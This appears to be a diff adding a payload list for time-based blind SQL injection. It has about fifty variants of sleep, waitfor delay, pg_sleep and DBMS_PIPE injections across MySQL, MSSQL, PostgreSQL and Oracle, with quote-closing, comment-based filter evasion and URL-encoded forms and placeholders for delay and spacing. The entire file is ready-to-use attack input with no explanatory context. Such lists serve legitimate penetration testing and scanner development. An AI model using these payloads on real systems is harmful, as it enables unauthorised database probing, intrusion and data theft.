@@ -1,0 +1,47 @@
+'and(select*from(select+sleep(*index*))a/**/union/**/select+1)='
+"and(select*from(select+sleep(*index*))a/**/union/**/select+1)="
+'XOR(if(now()=sysdate(),sleep(*index*),0))OR'
+*space*sleep(*index*)#
+*space*and sleep(*index*)=1
+1 or sleep(*index*)#
+" or sleep(*index*)#
+' or sleep(*index*)#
+" or sleep(*index*)="
+' or sleep(*index*)='
+1) or sleep(*index*)#
+") or sleep(*index*)="
+') or sleep(*index*)='
+1)) or sleep(*index*)#
+")) or sleep(*index*)="
+')) or sleep(*index*)='
+1'))) or sleep(*index*)--+-
+1"))) or sleep(*index*)--+-
+(select(0)from(select(sleep(*index*)))v)
+-CASE/**/WHEN(1=1)THEN(SLEEP(*index*))END
+-sleep/*f*/(*index*)
+'-IF(1=1,SLEEP(*index*),0) AND id='1
+'and(select+1)>0waitfor/**/delay'0:0:*index*
+'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('u',*index*)='u
+*space*waitfor delay '0:0:*index*'--
++waitfor+delay+'0:0:*index*'--
+/**/waitfor/**/delay/**/'0:0:*index*'--
+%20waitfor%20delay%20'0:0:*index*'--
+*space*waitfor delay '0:0:*index*'/*
++waitfor+delay+'0:0:*index*'/*
+/**/waitfor/**/delay/**/'0:0:*index*'/*
+%20waitfor%20delay%20'0:0:*index*'/*
+' waitfor delay '0:0:*index*'--+
+'+waitfor+delay+'0:0:*index*'--+
+'/**/ waitfor/**/delay/**/'0:0:*index*'--+
+'%20waitfor%20delay%20'0:0:*index*'--+
+'/**/and(select'1'from/**/pg_sleep(*index*))>'0
+*space*pg_sleep(*index*)--
+1 or pg_sleep(*index*)--
+" or pg_sleep(*index*)--
+' or pg_sleep(*index*)--
+1) or pg_sleep(*index*)--
+") or pg_sleep(*index*)--
+') or pg_sleep(*index*)--
+1)) or pg_sleep(*index*)--
+")) or pg_sleep(*index*)--
+')) or pg_sleep(*index*)--
